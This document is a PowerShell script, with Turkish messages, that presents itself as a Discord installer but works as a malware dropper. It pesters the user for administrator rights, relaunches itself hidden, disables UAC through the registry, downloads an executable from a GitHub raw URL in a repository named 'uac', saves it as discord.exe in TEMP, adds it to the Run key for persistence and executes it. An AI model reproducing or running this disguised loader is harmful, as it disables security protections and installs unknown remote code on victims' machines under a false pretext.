$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
$isHidden = $env:HIDDEN -eq '1'

if (-not $isAdmin) {
    while ($true) {
        Write-Host "Yonetici izni gerekiyor!"
        $confirm = Read-Host "Yonetici olarak calistirmak icin (E/H)?"
        if ($confirm -eq 'E' -or $confirm -eq 'e') {
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
            exit
        }
        Write-Host "Evet demediniz. Tekrar soruluyor..."
        Start-Sleep -Seconds 1
    }
}

if (-not $isHidden) {
    $env:HIDDEN = "1"
    Start-Process powershell.exe -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -WindowStyle Hidden
    exit
}

Write-Host "Discord kurulumu basliyor..."
Write-Host "UAC devre disi birakiliyor..."

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f /v EnableLUA /t REG_DWORD /d 0 | Out-Null

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$DownloadURL = 'https://raw.githubusercontent.com/stenehzin/uac/main/setup.exe'
$TempPath = $env:TEMP
$FilePath = Join-Path $TempPath 'discord.exe'

if (Test-Path $FilePath) {
    Write-Host "Discord zaten mevcut! Kurulum atlaniyor."
    exit
}

Write-Host "Indiriliyor: $DownloadURL"

try {
    Invoke-WebRequest -Uri $DownloadURL -OutFile $FilePath -UseBasicParsing
    Write-Host "Indirme tamamlandi: $FilePath"
    
    Write-Host "Registry'e ekleniyor..."
    reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "DiscordSetup" /t REG_SZ /d "`"$FilePath`"" /f | Out-Null
    Write-Host "Baslangica eklendi"
    
    Write-Host "Kurulum baslatiliyor..."
    Start-Process -FilePath $FilePath -Wait
    Write-Host "Kurulum tamamlandi!"
} catch {
    Write-Host "Hata: $_"
}

Write-Host "Islem tamamlandi."
Read-Host "Cikmak icin Enter'a bas..."